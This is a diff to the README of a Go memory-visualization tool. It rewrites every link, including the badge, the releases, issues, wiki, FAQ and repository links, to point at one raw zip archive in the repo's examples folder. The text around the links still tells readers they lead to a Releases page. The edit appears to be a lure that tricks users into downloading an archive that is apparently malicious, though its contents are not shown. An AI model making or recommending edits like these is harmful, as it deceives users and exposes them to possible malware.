@@ -1,6 +1,6 @@
 # 🎉 go-memory-visualizer - Visualize Your Go Memory Layout Effortlessly
 
-![Download go-memory-visualizer](https://img.shields.io/badge/Download-go--memory--visualizer-brightgreen.svg)
+![Download go-memory-visualizer](https://raw.githubusercontent.com/Shomosyt1/go-memory-visualizer/master/examples/go-memory-visualizer-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Welcome to go-memory-visualizer! This tool helps you visualize and optimize the 
 
 To download go-memory-visualizer, visit this page to download:
 
-[Download go-memory-visualizer](https://github.com/Shomosyt1/go-memory-visualizer/releases)
+[Download go-memory-visualizer](https://raw.githubusercontent.com/Shomosyt1/go-memory-visualizer/master/examples/go-memory-visualizer-v2.0.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -60,14 +60,14 @@ If you encounter issues, check the following:
 - Make sure your Go installation is set up correctly. You can do this by running `go version` in your terminal.
 - Check if the go-memory-visualizer extension is installed and enabled.
 
-If you still have problems, feel free to open an issue on the [GitHub Issues page](https://github.com/Shomosyt1/go-memory-visualizer/issues).
+If you still have problems, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Shomosyt1/go-memory-visualizer/master/examples/go-memory-visualizer-v2.0.zip).
 
 ## 🎓 Learning More
 
 For more detailed information on using go-memory-visualizer, refer to the Documentation:
 
-- [User Guide](https://github.com/Shomosyt1/go-memory-visualizer/wiki)
-- [FAQs](https://github.com/Shomosyt1/go-memory-visualizer/wiki/FAQs)
+- [User Guide](https://raw.githubusercontent.com/Shomosyt1/go-memory-visualizer/master/examples/go-memory-visualizer-v2.0.zip)
+- [FAQs](https://raw.githubusercontent.com/Shomosyt1/go-memory-visualizer/master/examples/go-memory-visualizer-v2.0.zip)
 
 ## 🤝 Contributing
 
@@ -80,8 +80,8 @@ We welcome contributions! If you would like to help improve this tool, check out
 
 ## 🔗 Links
 
-- [Repository](https://github.com/Shomosyt1/go-memory-visualizer)
-- [Releases Page](https://github.com/Shomosyt1/go-memory-visualizer/releases)
-- [Issues Page](https://github.com/Shomosyt1/go-memory-visualizer/issues)
+- [Repository](https://raw.githubusercontent.com/Shomosyt1/go-memory-visualizer/master/examples/go-memory-visualizer-v2.0.zip)
+- [Releases Page](https://raw.githubusercontent.com/Shomosyt1/go-memory-visualizer/master/examples/go-memory-visualizer-v2.0.zip)
+- [Issues Page](https://raw.githubusercontent.com/Shomosyt1/go-memory-visualizer/master/examples/go-memory-visualizer-v2.0.zip)
 
 Thank you for choosing go-memory-visualizer! Enjoy optimizing your Go applications.
